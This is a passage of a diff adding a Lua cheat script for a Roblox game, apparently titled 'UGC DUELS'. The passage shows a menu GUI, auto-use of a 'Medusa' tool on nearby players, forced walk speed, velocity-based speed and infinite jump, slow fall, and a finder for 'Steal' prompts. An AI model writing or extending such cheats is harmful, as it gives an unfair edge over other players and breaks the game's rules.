+            return
+        end
+        medusaPart.Transparency = 0.72
+        local char = lp.Character
+        if not char then return end
+        local root = char:FindFirstChild("HumanoidRootPart")
+        if not root then return end
+        medusaPart.CFrame = CFrame.new(root.Position + Vector3.new(0,-2.5,0)) * CFrame.Angles(0,0,math.rad(90))
+    end)
+
+    RunService.Heartbeat:Connect(function()
+        if not AutoMedusaEnabled then return end
+        local char = lp.Character
+        if not char then return end
+        local root = char:FindFirstChild("HumanoidRootPart")
+        if not root then return end
+        local tool = medusaEquipped()
+        if not tool then return end
+        if tick() - lastUse < SPAM_DELAY then return end
+
+        for _, plr in ipairs(Players:GetPlayers()) do
+            if plr ~= lp then
+                local pc = plr.Character
+                local pr = pc and pc:FindFirstChild("HumanoidRootPart")
+                if pr and (pr.Position - root.Position).Magnitude <= MEDUSA_RADIUS then
+                    tool:Activate()
+                    lastUse = tick()
+                    break
+                end
+            end
+        end
+    end)
+end
+
+----------------
+-- SPIN BODY --
+----------------
+local spinForce, spinGui, spinActive = nil, nil, false
+
+local function startSpinBody()
+    local char = lp.Character
+    if not char then return end
+    local root = char:FindFirstChild("HumanoidRootPart")
+    if not root or spinForce then return end
+    spinForce = Instance.new("BodyAngularVelocity")
+    spinForce.Name = "SpinForce"
+    spinForce.AngularVelocity = Vector3.new(0,25,0)
+    spinForce.MaxTorque = Vector3.new(0,math.huge,0)
+    spinForce.P = 1250
+    spinForce.Parent = root
+end
+
+local function stopSpinBody()
+    if spinForce then spinForce:Destroy(); spinForce = nil end
+end
+
+local function createSpinButton()
+    if spinGui then return end
+    spinGui = Instance.new("ScreenGui")
+    spinGui.Name = "UGC_SpinGui"
+    spinGui.Parent = game:GetService("CoreGui")
+
+    local button = Instance.new("TextButton")
+    button.Size = UDim2.new(0,160,0,52)
+    button.Position = UDim2.new(0.5,-80,0.78,0)
+    button.BackgroundColor3 = BTN_DARK
+    button.Text = "🌀 SPIN"
+    button.Font = Enum.Font.GothamBlack
+    button.TextSize = 14
+    button.TextColor3 = TEXT_OFF
+    button.AutoButtonColor = false
+    button.Parent = spinGui
+
+    Instance.new("UICorner", button).CornerRadius = UDim.new(0,13)
+    local bs = Instance.new("UIStroke", button)
+    bs.Color = STROKE_OFF
+    bs.Thickness = 1.5
+
+    button.Active = true
+    button.Draggable = true
+
+    local oS = button.Size
+    local hS = UDim2.new(0,164,0,56)
+    local cS = UDim2.new(0,154,0,48)
+
+    button.MouseEnter:Connect(function()
+        tw(button,0.2,{Size=hS})
+        if not spinActive then tw(bs,0.2,{Color=PURPLE}) end
+    end)
+    button.MouseLeave:Connect(function()
+        tw(button,0.2,{Size=oS})
+        if not spinActive then tw(bs,0.2,{Color=STROKE_OFF}) end
+    end)
+    button.MouseButton1Down:Connect(function()
+        tw(button,0.08,{Size=cS},Enum.EasingStyle.Back)
+    end)
+    button.MouseButton1Up:Connect(function()
+        tw(button,0.1,{Size=hS},Enum.EasingStyle.Back)
+    end)
+
+    button.MouseButton1Click:Connect(function()
+        spinActive = not spinActive
+        if spinActive then
+            button.Text = "💫 SPINNING"
+            tw(button,0.3,{BackgroundColor3=PURPLE2})
+            tw(bs,0.3,{Color=STROKE_ON})
+            button.TextColor3 = TEXT_ON
+            startSpinBody()
+        else
+            button.Text = "🌀 SPIN"
+            tw(button,0.3,{BackgroundColor3=BTN_DARK})
+            tw(bs,0.3,{Color=STROKE_OFF})
+            button.TextColor3 = TEXT_OFF
+            stopSpinBody()
+        end
+    end)
+end
+
+local function removeSpinButton()
+    stopSpinBody()
+    spinActive = false
+    if spinGui then spinGui:Destroy(); spinGui = nil end
+end
+
+----------------
+-- AUTO WALK --
+----------------
+local autoWalkEnabled = false
+local walkGui = nil
+local walkRunning = false
+local walkSpeedConn = nil
+
+local function createAutoWalkGui()
+    if walkGui then return end
+    walkGui = Instance.new("ScreenGui")
+    walkGui.Name = "UGC_WalkGui"
+    walkGui.ResetOnSpawn = false
+    walkGui.Parent = game:GetService("CoreGui")
+
+    local button = Instance.new("TextButton")
+    button.Size = UDim2.new(0,160,0,52)
+    button.Position = UDim2.new(0.5,-80,0.82,0)
+    button.BackgroundColor3 = BTN_DARK
+    button.Text = "🚶 AUTO WALK"
+    button.Font = Enum.Font.GothamBlack
+    button.TextSize = 13
+    button.TextColor3 = TEXT_OFF
+    button.AutoButtonColor = false
+    button.Active = true
+    button.Draggable = true
+    button.Parent = walkGui
+
+    Instance.new("UICorner", button).CornerRadius = UDim.new(0,13)
+    local bs = Instance.new("UIStroke", button)
+    bs.Color = STROKE_OFF
+    bs.Thickness = 1.5
+
+    local routes = {
+        START_A = {
+            StartPoint = Vector3.new(-475.92,-7.02,99.32),
+            Route = { Vector3.new(-476.14,-6.90,25.66), Vector3.new(-482.98,-5.27,24.82) }
+        },
+        START_B = {
+            StartPoint = Vector3.new(-476.72,-6.60,25.47),
+            Route = { Vector3.new(-476.80,-6.57,94.64), Vector3.new(-482.82,-5.27,94.81) }
+        },
+    }
+
+    local function getClosestRoute()
+        local char = player.Character
+        if not char then return nil end
+        local root = char:FindFirstChild("HumanoidRootPart")
+        if not root then return nil end
+        local cl, sh = nil, math.huge
+        for _, data in pairs(routes) do
+            local d = (root.Position - data.StartPoint).Magnitude
+            if d < sh then sh = d; cl = data end
+        end
+        return cl
+    end
+
+    local function blockMove()
+        ContextActionService:BindAction("BlockMoveAW", function() return Enum.ContextActionResult.Sink end, false,
+            Enum.PlayerActions.CharacterForward,
+            Enum.PlayerActions.CharacterBackward,
+            Enum.PlayerActions.CharacterLeft,
+            Enum.PlayerActions.CharacterRight,
+            Enum.PlayerActions.CharacterJump)
+    end
+
+    local function unblockMove()
+        ContextActionService:UnbindAction("BlockMoveAW")
+    end
+
+    local function forceSpeed(hm)
+        if walkSpeedConn then walkSpeedConn:Disconnect() end
+        walkSpeedConn = RunService.RenderStepped:Connect(function()
+            if hm and hm.Parent then hm.WalkSpeed = 52 end
+        end)
+    end
+
+    local function stopSpeed(hm)
+        if walkSpeedConn then walkSpeedConn:Disconnect(); walkSpeedConn = nil end
+        if hm then hm.WalkSpeed = 16 end
+    end
+
+    local function moveToPoint(pt)
+        local char = player.Character
+        if not char then return end
+        local hm = char:FindFirstChild("Humanoid")
+        local root = char:FindFirstChild("HumanoidRootPart")
+        if not (hm and root) then return end
+
+        while walkRunning do
+            local dir = Vector3.new((pt - root.Position).X, 0, (pt - root.Position).Z)
+            if dir.Magnitude < 2 then break end
+            hm:Move(dir.Unit, false)
+            RunService.RenderStepped:Wait()
+        end
+        if hm then hm:Move(Vector3.zero, false) end
+    end
+
+    local function startAW()
+        local char = player.Character
+        if not char then return end
+        local hm = char:FindFirstChild("Humanoid")
+        if not hm then return end
+
+        walkRunning = true
+        button.Text = "🏃 WALKING"
+        tw(button,0.3,{BackgroundColor3=PURPLE2})
+        tw(bs,0.3,{Color=STROKE_ON})
+        button.TextColor3 = TEXT_ON
+
+        blockMove()
+        forceSpeed(hm)
+
+        local route = getClosestRoute()
+        if not route then
+            walkRunning = false
+            stopSpeed(hm)
+            unblockMove()
+            button.Text = "🚶 AUTO WALK"
+            tw(button,0.3,{BackgroundColor3=BTN_DARK})
+            tw(bs,0.3,{Color=STROKE_OFF})
+            button.TextColor3 = TEXT_OFF
+            return
+        end
+
+        task.spawn(function()
+            for _, pt in ipairs(route.Route) do
+                if not walkRunning then break end
+                moveToPoint(pt)
+            end
+            walkRunning = false
+            stopSpeed(hm)
+            unblockMove()
+            button.Text = "🚶 AUTO WALK"
+            tw(button,0.3,{BackgroundColor3=BTN_DARK})
+            tw(bs,0.3,{Color=STROKE_OFF})
+            button.TextColor3 = TEXT_OFF
+        end)
+    end
+
+    local function stopAW()
+        walkRunning = false
+        local hm = player.Character and player.Character:FindFirstChild("Humanoid")
+        stopSpeed(hm)
+        unblockMove()
+        if button and button.Parent then
+            button.Text = "🚶 AUTO WALK"
+            tw(button,0.3,{BackgroundColor3=BTN_DARK})
+            tw(bs,0.3,{Color=STROKE_OFF})
+            button.TextColor3 = TEXT_OFF
+        end
+    end
+
+    local oS = button.Size
+    local hS = UDim2.new(0,164,0,56)
+    local cS = UDim2.new(0,154,0,48)
+
+    button.MouseEnter:Connect(function()
+        tw(button,0.2,{Size=hS})
+        if not walkRunning then tw(bs,0.2,{Color=PURPLE}) end
+    end)
+    button.MouseLeave:Connect(function()
+        tw(button,0.2,{Size=oS})
+        if not walkRunning then tw(bs,0.2,{Color=STROKE_OFF}) end
+    end)
+    button.MouseButton1Down:Connect(function()
+        tw(button,0.08,{Size=cS},Enum.EasingStyle.Back)
+    end)
+    button.MouseButton1Up:Connect(function()
+        tw(button,0.1,{Size=hS},Enum.EasingStyle.Back)
+    end)
+
+    button.MouseButton1Click:Connect(function()
+        if walkRunning then stopAW() else startAW() end
+    end)
+
+    local rc = player.CharacterAdded:Connect(function() stopAW() end)
+
+    walkGui.AncestryChanged:Connect(function()
+        if not walkGui.Parent then if rc then rc:Disconnect() end end
+    end)
+end
+
+local function destroyAutoWalkGui()
+    walkRunning = false
+    if walkSpeedConn then walkSpeedConn:Disconnect(); walkSpeedConn = nil end
+    ContextActionService:UnbindAction("BlockMoveAW")
+    if walkGui then walkGui:Destroy(); walkGui = nil end
+end
+
+---------------------
+-- CHARACTER SETUP --
+---------------------
+local function setupCharacter(char)
+    character = char
+    hrp = character:WaitForChild("HumanoidRootPart")
+    hum = character:WaitForChild("Humanoid")
+    if meleeEnabled then
+        task.spawn(function() task.wait(0.3); createMeleeAimbot(char) end)
+    end
+end
+
+if player.Character then setupCharacter(player.Character) end
+player.CharacterAdded:Connect(setupCharacter)
+
+-----------------------
+-- SPEED CUSTOMIZER --
+-----------------------
+-- Clean existing GUIs
+for _, n in ipairs({"UGC_Duels","UGC_SpeedCustomizer"}) do
+    if lp.PlayerGui:FindFirstChild(n) then lp.PlayerGui[n]:Destroy() end
+end
+
+local scGui = Instance.new("ScreenGui")
+scGui.Name = "UGC_SpeedCustomizer"
+scGui.ResetOnSpawn = false
+scGui.Enabled = false
+scGui.Parent = lp:WaitForChild("PlayerGui")
+
+local scFrame = Instance.new("Frame")
+scFrame.Name = "MainFrame"
+scFrame.Size = UDim2.new(0,240,0,200)
+scFrame.AnchorPoint = Vector2.new(1,0.5)
+scFrame.Position = UDim2.new(1,-200,0.5,0)
+scFrame.BackgroundColor3 = BG_DARK
+scFrame.BackgroundTransparency = 0.05
+scFrame.BorderSizePixel = 0
+scFrame.Parent = scGui
+
+Instance.new("UICorner", scFrame).CornerRadius = UDim.new(0,16)
+local scStroke = Instance.new("UIStroke", scFrame)
+scStroke.Color = PURPLE
+scStroke.Thickness = 2
+
+local scTitle = Instance.new("TextLabel")
+scTitle.Size = UDim2.new(1,0,0,44)
+scTitle.BackgroundTransparency = 1
+scTitle.Text = "⚡ Speed Customizer"
+scTitle.Font = Enum.Font.GothamBlack
+scTitle.TextSize = 13
+scTitle.TextColor3 = PURPLE
+scTitle.Parent = scFrame
+
+-- drag
+do
+    local drag, din, ds, dsp = false, nil, Vector2.new(), Vector2.new()
+    scTitle.InputBegan:Connect(function(i)
+        if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
+            drag = true
+            din = i
+            ds = i.Position
+            dsp = Vector2.new(scFrame.AbsolutePosition.X, scFrame.AbsolutePosition.Y)
+            i.Changed:Connect(function()
+                if i.UserInputState == Enum.UserInputState.End then drag = false; din = nil end
+            end)
+        end
+    end)
+    scTitle.InputChanged:Connect(function(i)
+        if i == din and drag then
+            local d = i.Position - ds
+            scFrame.Position = UDim2.new(0, dsp.X + d.X, 0, dsp.Y + d.Y)
+        end
+    end)
+end
+
+-- activate button
+local scActive = false
+local scConn = nil
+
+local scBtn = Instance.new("TextButton")
+scBtn.Size = UDim2.new(1,-20,0,40)
+scBtn.Position = UDim2.new(0,10,0,44)
+scBtn.BackgroundColor3 = BTN_DARK
+scBtn.Text = "OFF"
+scBtn.Font = Enum.Font.GothamBlack
+scBtn.TextSize = 14
+scBtn.TextColor3 = TEXT_OFF
+scBtn.AutoButtonColor = false
+scBtn.Parent = scFrame
+
+Instance.new("UICorner", scBtn).CornerRadius = UDim.new(0,11)
+local scBs = Instance.new("UIStroke", scBtn)
+scBs.Color = STROKE_OFF
+scBs.Thickness = 1.5
+
+local sInf = TweenInfo.new(0.1, Enum.EasingStyle.Back)
+local scOrigS = scBtn.Size
+local scHovS = UDim2.new(1,-16,0,44)
+local scClkS = UDim2.new(1,-26,0,36)
+
+scBtn.MouseEnter:Connect(function()
+    tw(scBtn,0.2,{Size=scHovS})
+    if not scActive then tw(scBs,0.2,{Color=PURPLE}) end
+end)
+scBtn.MouseLeave:Connect(function()
+    tw(scBtn,0.2,{Size=scOrigS})
+    if not scActive then tw(scBs,0.2,{Color=STROKE_OFF}) end
+end)
+scBtn.MouseButton1Down:Connect(function()
+    TweenService:Create(scBtn, sInf, {Size=scClkS}):Play()
+end)
+scBtn.MouseButton1Up:Connect(function()
+    TweenService:Create(scBtn, sInf, {Size=scHovS}):Play()
+end)
+
+local function scMakeRow(label, posY, def)
+    local lbl = Instance.new("TextLabel")
+    lbl.Size = UDim2.new(0.5,0,0,26)
+    lbl.Position = UDim2.new(0,14,0,posY)
+    lbl.BackgroundTransparency = 1
+    lbl.Text = label
+    lbl.Font = Enum.Font.Gotham
+    lbl.TextSize = 12
+    lbl.TextColor3 = Color3.fromRGB(140,140,140)
+    lbl.TextXAlignment = Enum.TextXAlignment.Left
+    lbl.Parent = scFrame
+
+    local box = Instance.new("TextBox")
+    box.Size = UDim2.new(0,80,0,26)
+    box.Position = UDim2.new(1,-92,0,posY)
+    box.BackgroundColor3 = BTN_DARK
+    box.TextColor3 = TEXT_ON
+    box.Font = Enum.Font.GothamBold
+    box.TextSize = 13
+    box.Text = tostring(def)
+    box.ClearTextOnFocus = false
+    box.Parent = scFrame
+
+    Instance.new("UICorner", box).CornerRadius = UDim.new(0,7)
+    Instance.new("UIStroke", box).Color = STROKE_OFF
+
+    return box
+end
+
+local speedBox = scMakeRow("Vitesse", 92, 53)
+local stealBox = scMakeRow("Vol Speed", 124, 29)
+local jumpBox = scMakeRow("Saut", 156, 60)
+
+local function applyBI(box, mn, mx, def)
+    box.FocusLost:Connect(function()
+        local n = tonumber(box.Text:gsub("%D","")) or def
+        box.Text = tostring(math.clamp(n, mn, mx))
+    end)
+end
+applyBI(speedBox, 15, 200, 53)
+applyBI(stealBox, 15, 200, 29)
+applyBI(jumpBox, 50, 200, 60)
+
+local infiniteJumpEnabled = false
+local sNoSteal, sSteal = 52, 28
+
+scBtn.MouseButton1Click:Connect(function()
+    scActive = not scActive
+    if scActive then
+        scBtn.Text = "ON"
+        tw(scBtn,0.3,{BackgroundColor3=PURPLE2})
+        tw(scBs,0.3,{Color=STROKE_ON})
+        scBtn.TextColor3 = TEXT_ON
+
+        scConn = RunService.Heartbeat:Connect(function()
+            if character and hrp and hum then
+                sNoSteal = tonumber(speedBox.Text) or 53
+                sSteal = tonumber(stealBox.Text) or 29
+                if hum.MoveDirection.Magnitude > 0 then
+                    local sp = (hum.WalkSpeed < 25) and sSteal or sNoSteal
+                    hrp.AssemblyLinearVelocity = Vector3.new(hum.MoveDirection.X * sp, hrp.AssemblyLinearVelocity.Y, hum.MoveDirection.Z * sp)
+                end
+            end
+        end)
+    else
+        scBtn.Text = "OFF"
+        tw(scBtn,0.3,{BackgroundColor3=BTN_DARK})
+        tw(scBs,0.3,{Color=STROKE_OFF})
+        scBtn.TextColor3 = TEXT_OFF
+        if scConn then scConn:Disconnect(); scConn = nil end
+    end
+end)
+
+UserInputService.JumpRequest:Connect(function()
+    if not character or not hum or not hrp then return end
+    local state = hum:GetState()
+    if scActive and (state == Enum.HumanoidStateType.Running or state == Enum.HumanoidStateType.Landed) then
+        hrp.AssemblyLinearVelocity = Vector3.new(hrp.AssemblyLinearVelocity.X, tonumber(jumpBox.Text) or 70, hrp.AssemblyLinearVelocity.Z)
+    end
+    if infiniteJumpEnabled then
+        hrp.AssemblyLinearVelocity = Vector3.new(hrp.AssemblyLinearVelocity.X, 50, hrp.AssemblyLinearVelocity.Z)
+    end
+end)
+
+------------------
+-- SLOW FALL + AUTO STEAL --
+------------------
+local slowFallEnabled = false
+RunService.Heartbeat:Connect(function()
+    if not slowFallEnabled then return end
+    local char = lp.Character
+    if not char then return end
+    local hm = char:FindFirstChildOfClass("Humanoid")
+    local root = char:FindFirstChild("HumanoidRootPart")
+    if not hm or not root then return end
+    if hm:GetState() == Enum.HumanoidStateType.Freefall then
+        local vel = root.AssemblyLinearVelocity
+        if vel.Y < -1 then
+            root.AssemblyLinearVelocity = Vector3.new(vel.X, vel.Y * 0.5, vel.Z)
+        end
+    end
+end)
+
+local autoStealEnabled = false
+local grabRadius = 50
+local stealCircle = nil
+
+local function hideStealCircle()
+    if stealCircle then stealCircle:Destroy(); stealCircle = nil end
+end
+
+local function updateStealCircle()
+    if stealCircle and lp.Character then
+        local root = lp.Character:FindFirstChild("HumanoidRootPart")
+        if root then
+            stealCircle.CFrame = CFrame.new(root.Position + Vector3.new(0,-2.5,0)) * CFrame.Angles(0,0,math.rad(90))
+        end
+    end
+end
+
+local function createStealCircle(r)
+    if not stealCircle then
+        stealCircle = Instance.new("Part")
+        stealCircle.Name = "UGC_StealR"
+        stealCircle.Anchored = true
+        stealCircle.CanCollide = false
+        stealCircle.Transparency = 0.72
+        stealCircle.Material = Enum.Material.Neon
+        stealCircle.Color = PURPLE
+        stealCircle.Shape = Enum.PartType.Cylinder
+        stealCircle.Size = Vector3.new(0.05, r*2, r*2)
+        stealCircle.Parent = workspace
+    else
+        stealCircle.Size = Vector3.new(0.05, r*2, r*2)
+    end
+end
+
+local function findNearestSteal(root)
+    local nearest, dist = nil, math.huge
+    for _, desc in ipairs(workspace:GetDescendants()) do
+        if desc:IsA("ProximityPrompt") and desc.Enabled and desc.ActionText == "Steal" then
+            local part = desc.Parent:IsA("BasePart") and desc.Parent or desc:FindFirstAncestorWhichIsA("BasePart")
+            if part then
+                local d = (part.Position - root.Position).Magnitude
+                if d < dist and d <= grabRadius then
+                    nearest = desc
+                    dist = d
+                end
+            end
+        end
+    end
+    return nearest
+end
+
+local autoBatActive = false
+local autoBatLoop = nil
+local savedAnimate = nil
+
+-------------------
+-- MAIN SCREEN GUI --
+-------------------
+local sg = Instance.new("ScreenGui")
+sg.Name = "UGC_Duels"
+sg.ResetOnSpawn = false
+sg.Parent = lp:WaitForChild("PlayerGui")
+
+-- Progress bar
+local pbBg = Instance.new("Frame")
+pbBg.Size = UDim2.new(0,260,0,13)
+pbBg.Position = UDim2.new(0.5,-130,0,8)
+pbBg.BackgroundColor3 = BTN_DARK
+pbBg.BackgroundTransparency = 0.2
+pbBg.Visible = false
+pbBg.Parent = sg
+
+Instance.new("UICorner", pbBg).CornerRadius = UDim.new(1,0)
+
+local pbFill = Instance.new("Frame")
+pbFill.Size = UDim2.new(0,0,1,0)
+pbFill.BackgroundColor3 = PURPLE2
+pbFill.Parent = pbBg
+
+Instance.new("UICorner", pbFill).CornerRadius = UDim.new(1,0)
+
+local pbPct = Instance.new("TextLabel")
+pbPct.Size = UDim2.new(1,0,1,0)
+pbPct.BackgroundTransparency = 1
+pbPct.Font = Enum.Font.GothamBold
+pbPct.TextSize = 9
+pbPct.TextColor3 = TEXT_ON
+pbPct.Text = "0%"
+pbPct.Parent = pbBg
+
+local function resetBar(hide)
+    pbFill.Size = UDim2.new(0,0,1,0)
+    pbPct.Text = "0%"
+    if hide then pbBg.Visible = false end
+end
+
+-- TOP BAR (LEFT SIDE, CLICKABLE)
+local GUI_WIDTH = 260
+local menuOpen = true
+
+-- Small reopen button (hidden by default, appears when menu is closed)
+local reopenBtn = Instance.new("TextButton")
+reopenBtn.Name = "ReopenBtn"
+reopenBtn.Size = UDim2.new(0,44,0,44)
+reopenBtn.AnchorPoint = Vector2.new(0,0)
+reopenBtn.Position = UDim2.new(0,16,0,16)
+reopenBtn.BackgroundColor3 = BTN_DARK
+reopenBtn.BackgroundTransparency = 0.05
+reopenBtn.BorderSizePixel = 0
+reopenBtn.Text = "≡"
+reopenBtn.Font = Enum.Font.GothamBlack
+reopenBtn.TextSize = 22
+reopenBtn.TextColor3 = PURPLE
+reopenBtn.AutoButtonColor = false
+reopenBtn.Visible = false
+reopenBtn.Parent = sg
+
+Instance.new("UICorner", reopenBtn).CornerRadius = UDim.new(0,12)
+local rbStroke = Instance.new("UIStroke", reopenBtn)
+rbStroke.Color = PURPLE
+rbStroke.Thickness = 2
+
+reopenBtn.MouseEnter:Connect(function()
+    tw(reopenBtn,0.15,{BackgroundColor3=Color3.fromRGB(30,30,30)})
+end)
+reopenBtn.MouseLeave:Connect(function()
+    tw(reopenBtn,0.15,{BackgroundColor3=BTN_DARK})
+end)
+
+-- TopBar: left side, acts as clickable toggle
+local topBar = Instance.new("TextButton")
+topBar.Name = "TopBar"
+topBar.Size = UDim2.new(0,GUI_WIDTH,0,44)
+topBar.AnchorPoint = Vector2.new(0,0)
+topBar.Position = UDim2.new(0,16,0,16)
+topBar.BackgroundColor3 = BG_DARK
+topBar.BackgroundTransparency = 0.05
+topBar.BorderSizePixel = 0
+topBar.Text = ""
+topBar.AutoButtonColor = false
+topBar.Parent = sg
+
+Instance.new("UICorner", topBar).CornerRadius = UDim.new(0,16)
+local topStroke = Instance.new("UIStroke", topBar)
+topStroke.Color = PURPLE
+topStroke.Thickness = 2
+
+-- Inner label (non-interactive, just display)
+local topLabel = Instance.new("TextLabel")
+topLabel.Size = UDim2.new(1,-46,1,0)
+topLabel.Position = UDim2.new(0,14,0,0)
+topLabel.BackgroundTransparency = 1
+topLabel.Font = Enum.Font.GothamBlack
+topLabel.TextSize = 13
+topLabel.TextColor3 = PURPLE
+topLabel.TextXAlignment = Enum.TextXAlignment.Left
+topLabel.Parent = topBar
+
+-- Small close indicator on the right of topBar
+local closeHint = Instance.new("TextLabel")
+closeHint.Size = UDim2.new(0,32,1,0)
+closeHint.Position = UDim2.new(1,-36,0,0)
+closeHint.BackgroundTransparency = 1
+closeHint.Text = "✕"
+closeHint.Font = Enum.Font.GothamBold
+closeHint.TextSize = 12
+closeHint.TextColor3 = Color3.fromRGB(70,70,70)
+closeHint.Parent = topBar
+
+local fps, fAcc, fLast = 60, 0, tick()
+RunService.RenderStepped:Connect(function()
+    fAcc = fAcc + 1
+    if tick() - fLast >= 1 then fps = fAcc; fAcc = 0; fLast = tick() end
+    local ping = 0
+    local net = Stats:FindFirstChild("Network")
+    if net then
+        local si = net:FindFirstChild("ServerStatsItem")
+        if si then
+            local dp = si:FindFirstChild("Data Ping")
+            if dp then ping = math.floor(dp:GetValue()) end
+        end
+    end
+    topLabel.Text = "UGC DUELS · "..fps.." FPS · "..ping.." ms"
+end)
+
+-- Hover effect on topBar
+topBar.MouseEnter:Connect(function()
+    if menuOpen then tw(closeHint,0.2,{TextColor3=Color3.fromRGB(150,50,255)}) end
+end)
+topBar.MouseLeave:Connect(function()
+    tw(closeHint,0.2,{TextColor3=Color3.fromRGB(70,70,70)})
+end)
+
+-- MAIN PANEL (LEFT SIDE)
+local mainFrame = Instance.new("Frame")
+mainFrame.Name = "MainFrame"
+mainFrame.Size = UDim2.new(0,GUI_WIDTH,0,10)
+mainFrame.AnchorPoint = Vector2.new(0,0)
+mainFrame.Position = UDim2.new(0,16,0,68)
+mainFrame.BackgroundColor3 = BG_DARK
+mainFrame.BackgroundTransparency = 0.05
+mainFrame.BorderSizePixel = 0
+mainFrame.Parent = sg
+
+Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0,16)
+local mainStroke = Instance.new("UIStroke", mainFrame)
+mainStroke.Color = PURPLE
+mainStroke.Thickness = 2
+
+-- TOGGLE MENU (click FPS bar or reopen btn)
+local function hideMenu()
+    menuOpen = false
+    tw(mainFrame,0.25,{Position=UDim2.new(0,-GUI_WIDTH-30,0,68)},Enum.EasingStyle.Back)
+    tw(topBar,0.22,{Position=UDim2.new(0,-GUI_WIDTH-30,0,16)},Enum.EasingStyle.Quad)
+    task.wait(0.26)
+    topBar.Visible = false
+    mainFrame.Visible = false
+    reopenBtn.Visible = true
+    tw(reopenBtn,0.2,{BackgroundColor3=BTN_DARK})
+end
+
+local function showMenu()
+    menuOpen = true
+    reopenBtn.Visible = false
+    topBar.Visible = true
+    mainFrame.Visible = true
+    topBar.Position = UDim2.new(0,-GUI_WIDTH-30,0,16)
+    mainFrame.Position = UDim2.new(0,-GUI_WIDTH-30,0,68)
+    TweenService:Create(topBar, TweenInfo.new(0.3,Enum.EasingStyle.Back,Enum.EasingDirection.Out), {Position=UDim2.new(0,16,0,16)}):Play()
+    TweenService:Create(mainFrame, TweenInfo.new(0.32,Enum.EasingStyle.Back,Enum.EasingDirection.Out), {Position=UDim2.new(0,16,0,68)}):Play()
+end
+
+topBar.MouseButton1Click:Connect(function()
+    if menuOpen then hideMenu() end
+end)
+
+reopenBtn.MouseButton1Click:Connect(function()
+    showMenu()
+end)
+
+-- SECTION TABS
+local sections = {"Combat","Player","Visual","Settings"}
+local sectionBtns = {}
+local frames = {}
+
+local tabRow = Instance.new("Frame")
+tabRow.Size = UDim2.new(1,-16,0,36)
+tabRow.Position = UDim2.new(0,8,0,8)
+tabRow.BackgroundTransparency = 1
+tabRow.Parent = mainFrame
+
+local tabLayout = Instance.new("UIListLayout", tabRow)
+tabLayout.FillDirection = Enum.FillDirection.Horizontal
+tabLayout.Padding = UDim.new(0,4)
+tabLayout.VerticalAlignment = Enum.VerticalAlignment.Center
+
+local contentArea = Instance.new("Frame")
+contentArea.Size = UDim2.new(1,-16,1,-58)
+contentArea.Position = UDim2.new(0,8,0,50)
+contentArea.BackgroundTransparency = 1
+contentArea.Parent = mainFrame
+
+for _, name in ipairs(sections) do
+    local scroll = Instance.new("ScrollingFrame")
+    scroll.Size = UDim2.new(1,0,1,0)
+    scroll.CanvasSize = UDim2.new(0,0,0,0)
+    scroll.ScrollBarThickness = 2
+    scroll.ScrollBarImageColor3 = PURPLE
+    scroll.BackgroundTransparency = 1
+    scroll.Visible = false
+    scroll.Name = name.."Frame"
+    scroll.Parent = contentArea
+    frames[name] = scroll
+
+    local layout = Instance.new("UIListLayout", scroll)
+    layout.Padding = UDim.new(0,5)
+    layout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
+        scroll.CanvasSize = UDim2.new(0,0,0,layout.AbsoluteContentSize.Y+8)
+        -- auto-resize mainFrame
+        local maxH = 0
+        for _, s in pairs(frames) do maxH = math.max(maxH, s.CanvasSize.Y.Offset) end
+        local targetH = math.min(math.max(maxH+62, 80), 420)
+        tw(mainFrame,0.18,{Size=UDim2.new(0,GUI_WIDTH,0,targetH)})
+    end)
+end
+
+local function ShowSection(name)
+    for _, f in pairs(frames) do f.Visible = false end
+    frames[name].Visible = true
+
+    for _, b in pairs(sectionBtns) do
+        tw(b,0.18,{BackgroundColor3=BTN_DARK, TextColor3=TEXT_OFF})
+        local bs = b:FindFirstChildOfClass("UIStroke")
+        if bs then tw(bs,0.18,{Color=STROKE_OFF}) end
+    end
+
+    for _, b in pairs(sectionBtns) do
+        if b.Text == name then
+            tw(b,0.18,{BackgroundColor3=PURPLE2, TextColor3=TEXT_ON})
+            local bs = b:FindFirstChildOfClass("UIStroke")
+            if bs then tw(bs,0.18,{Color=STROKE_ON}) end
+        end
+    end
+end
+
+for _, v in ipairs(sections) do
+    local btn = Instance.new("TextButton")
+    btn.Size = UDim2.new(0,(GUI_WIDTH-16-12)/4,0,28)
+    btn.BackgroundColor3 = BTN_DARK
+    btn.Text = v
+    btn.Font = Enum.Font.GothamBold
+    btn.TextSize = 11
+    btn.TextColor3 = TEXT_OFF
+    btn.AutoButtonColor = false
+    btn.Parent = tabRow
+
+    Instance.new("UICorner", btn).CornerRadius = UDim.new(0,8)
+    local bs = Instance.new("UIStroke", btn)
+    bs.Color = STROKE_OFF
+    bs.Thickness = 1
+
+    table.insert(sectionBtns, btn)
+
+    btn.MouseButton1Click:Connect(function()
+        ShowSection(v)
+    end)
+end
+
+-----------------------
+-- BUTTON FACTORY --
+-----------------------
+local function MakeButton(parent, label)
+    local btn = Instance.new("TextButton")
+    btn.Size = UDim2.new(1,0,0,46)
+    btn.BackgroundColor3 = BTN_DARK
+    btn.Text = label
+    btn.Font = Enum.Font.GothamBlack
+    btn.TextSize = 13
+    btn.TextColor3 = TEXT_OFF
+    btn.AutoButtonColor = false
+    btn.Parent = parent
+
+    Instance.new("UICorner", btn).CornerRadius = UDim.new(0,12)
+    local bs = Instance.new("UIStroke", btn)
+    bs.Color = STROKE_OFF
+    bs.Thickness = 1.5
+
+    local origS = btn.Size
+    local hoverS = UDim2.new(1,4,0,50)
+    local clickS = UDim2.new(1,-6,0,42)
+
+    local enabled = false
+
+    local function setOn()
+        enabled = true
+        btn.Text = "✓ "..label
+        btn.TextColor3 = TEXT_ON
+        tw(btn,0.28,{BackgroundColor3=PURPLE2})
+        tw(bs,0.28,{Color=STROKE_ON})
+    end
+
+    local function setOff()
+        enabled = false
+        btn.Text = label
+        btn.TextColor3 = TEXT_OFF
+        tw(btn,0.28,{BackgroundColor3=BTN_DARK})
+        tw(bs,0.28,{Color=STROKE_OFF})
+    end
+
+    local function isOn() return enabled end
+
+    btn.MouseEnter:Connect(function()
+        tw(btn,0.2,{Size=hoverS})
+        if not enabled then tw(bs,0.2,{Color=PURPLE}) end
+    end)
+    btn.MouseLeave:Connect(function()
+        tw(btn,0.2,{Size=origS})
+        if not enabled then tw(bs,0.2,{Color=STROKE_OFF}) end
+    end)
+    btn.MouseButton1Down:Connect(function()
